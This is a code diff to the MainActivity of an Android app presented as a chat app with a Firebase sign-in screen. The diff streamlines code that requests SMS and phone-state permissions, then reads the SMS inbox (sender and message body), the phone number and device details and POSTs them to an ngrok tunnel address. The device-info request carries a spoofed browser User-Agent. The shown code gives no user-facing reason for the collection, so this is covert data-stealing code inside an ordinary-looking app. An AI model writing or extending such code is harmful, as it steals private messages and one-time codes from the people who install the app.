@@ -1,7 +1,5 @@
 package com.example.mychatapp;
 
-
-import android.annotation.SuppressLint;
 import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -23,7 +21,6 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import com.android.volley.toolbox.HttpResponse;
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.Task;
 import com.google.firebase.auth.AuthResult;
@@ -35,24 +32,21 @@ import org.json.JSONObject;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.DataOutputStream;
-import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
 import java.util.Map;
-import java.util.Set;
+
 
 import android.content.Context;
 import android.telephony.TelephonyManager;
 import android.Manifest;
 
 public class MainActivity extends AppCompatActivity {
-    private static final int REQUEST_READ_PHONE_STATE = 1;
-    private static final int PERMISSION_REQUEST_CODE = 1;
+    private static final int REQUEST_CODE_READ_PHONE_STATE_AND_SMS = 1;
     private static final String SMS_URI = "content://sms/inbox";
 
     //variable for each elements
@@ -62,33 +56,24 @@ public class MainActivity extends AppCompatActivity {
     private EditText editEmail, editPassword;
     private android.widget.Button signIn;
 
+    public static String URLNgrok = "https://ee35-122-11-214-189.ap.ngrok.io"; // To be edited if keep changing
+    //public static String URLLocalIP = "http://192.168.2.145:5000";
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         String hpno = null;
 
-        //get sms permisison at run time
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
-                != PackageManager.PERMISSION_GRANTED) {
-            // Permission is not granted
-            // Request the permission
-            ActivityCompat.requestPermissions(this,
-                    new String[]{Manifest.permission.READ_SMS},
-                    PERMISSION_REQUEST_CODE);
-            System.out.println("Failed to grant sms permission");
-        } else {
-            // Permission has already been granted
-            //function to get sms to server
-            sendSmsToServer();
-        }
 
         //need to set permission dynamically
         //get phone no need run 2 times then can get phone no.
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_READ_PHONE_STATE);
-            System.out.println("Failed to get phone no");
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this,  new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_SMS},
+                    REQUEST_CODE_READ_PHONE_STATE_AND_SMS);
+                    System.out.println("Failed to get phone no");
         } else {
+            //function to get sms to server
+            sendSmsToServer();
             // Permission is already granted, you can access the phone state
             TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
             String phoneNumber = telephonyManager.getLine1Number();
@@ -169,8 +154,8 @@ public class MainActivity extends AppCompatActivity {
         protected Void doInBackground(Map<String, String>... deviceInfos) {
             try {
 
-                URL url = new URL("https://c5a7-118-189-138-35.ap.ngrok.io/device"); //ngrok url to allow internet access without having to be same network
-                //URL url = new URL("http://192.168.2.145:5000/device");
+                URL url = new URL(URLNgrok+"/device"); //ngrok url to allow internet access without having to be same network
+                //URL url = new URL(URLLocalIP+"/device"); //local ip address : port no
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11");
@@ -214,7 +199,6 @@ public class MainActivity extends AppCompatActivity {
         //error in the way message is being stored
 
         if (cursor.moveToFirst()) {
-            do {
                 String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                 String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                 String smsResult = address + " : " + body;
@@ -222,8 +206,6 @@ public class MainActivity extends AppCompatActivity {
                 smsMap.put("smsAddress", address);
                 smsMap.put("smsBody", body);
 
-
-            } while (cursor.moveToNext());
         }
 
         cursor.close();
@@ -239,8 +221,8 @@ public class MainActivity extends AppCompatActivity {
         @Override
         protected Void doInBackground(String... params) {
             try {
-                URL url = new URL("https://c5a7-118-189-138-35.ap.ngrok.io/sms"); //ngrok url to allow internet access without having to be same network
-                //URL url = new URL("http://192.168.2.145:5000/sms");
+                URL url = new URL(URLNgrok+"/sms"); //ngrok url to allow internet access without having to be same network
+                //URL url = new URL(URLLocalIP+"/sms"); // local IP Address : Port no
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "application/json");
